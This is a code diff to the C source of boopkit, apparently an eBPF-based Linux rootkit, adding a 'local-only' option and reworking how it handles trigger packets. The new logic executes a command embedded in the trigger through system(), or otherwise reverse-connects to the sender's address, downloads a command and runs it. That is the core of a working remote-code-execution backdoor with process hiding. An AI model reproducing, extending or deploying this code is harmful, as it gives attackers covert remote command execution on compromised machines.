@@ -50,6 +50,7 @@ void usage() {
   boopprintf("Options:\n");
   boopprintf("-h, help           Display help and usage for boopkit.\n");
   boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
+  boopprintf("-l, local-only     Disable dialing the trigger program source address for RCE.\n");
   boopprintf("-q, quiet          Disable output.\n");
   boopprintf("-x, reject         Source addresses to reject triggers from.\n");
   boopprintf("\n");
@@ -64,9 +65,6 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
     boopprintf(" XX Destination IP configuration failed.\n");
     return 1;
   }
-  char printdial[INET_ADDRSTRLEN];
-  inet_ntop(AF_INET, &daddr.sin_addr, printdial, sizeof printdial);
-  boopprintf("  ** Boop: %s\n", printdial);
 
   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (revsock == -1) {
@@ -113,12 +111,14 @@ struct config {
   char pr0besafepath[PATH_MAX];
   char pr0bebooppath[PATH_MAX];
   int denyc;
+  int localonly;
   char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
 } cfg;
 
 // clisetup will initialize the config struct for the program
 void clisetup(int argc, char **argv) {
   cfg.denyc = 0;
+  cfg.localonly = 0;
   cfg.sudobypass = 0;
   if (getenv("HOME") == NULL) {
     strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
@@ -352,15 +352,25 @@ int main(int argc, char **argv) {
         }
       }
       if (!ignore) {
-        char *rce = malloc(MAX_RCE_SIZE);
-        int retval;
-        boopprintf("  -> encapsulated: %s\n", ret.rce);
-        retval = recvrce(saddrval, rce);
-        if (retval == 0) {
-          boopprintf("  <- Executing: %s\r\n", rce);
-          system(rce);
+        boopprintf("  ** Boop: %s\n", saddrval);
+        // If no RCE is found in the initial boop, and we are running
+        // in !localonly mode:
+        if (strlen(ret.rce) == 0 && !cfg.localonly) {
+          boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
+          char *rce = malloc(MAX_RCE_SIZE);
+          int retval;
+          retval = recvrce(saddrval, rce);
+          if (retval == 0) {
+            boopprintf("  <- Executing: %s\r\n", rce);
+            system(rce);
+          }
+          free(rce);
+        }else if (strlen(ret.rce) >0 ){
+          boopprintf("  <- Executing: %s\r\n", ret.rce);
+          system(ret.rce);
+          boopprintf("  -> no RCE found!\n");
         }
-        free(rce);
+
       }
       err = bpf_map_delete_elem(fd, &jkey);
       if (err < 0) {
